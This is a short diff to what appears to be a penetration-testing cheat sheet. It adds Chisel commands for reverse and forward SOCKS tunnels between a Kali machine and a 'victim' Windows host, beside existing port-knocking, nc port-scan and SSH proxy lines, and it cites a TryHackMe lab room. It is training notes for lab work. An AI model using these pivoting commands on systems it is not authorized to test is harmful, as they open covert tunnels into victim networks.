@@ -361,6 +361,19 @@ knock [IP_ADDR] [PORT1] [PORT2] [PORT3] -d [DELAY MILLISEC]
 ```
 nc -vv -z 10.1.1.1 1-65535 2>&1 | grep "succeeded"
 ssh -N -D 127.0.0.1:9999 sean@10.11.1.251
+---------Chisel---------
+Reverse proxy:
+On kali: 
+./chisel server -p 9999 --reverse &
+On victim/windows:
+chisel.exe client [KALI_IP]:9999 R:socks &
+
+Forward proxy:
+On kali: 
+./chisel client [VICTIM_IP]:8080 9999:socks
+On victim/windows:
+chisel.exe server -p 8080 --socks5
+#   https://tryhackme.com/room/wreath
 ```
 
 ## Checklist
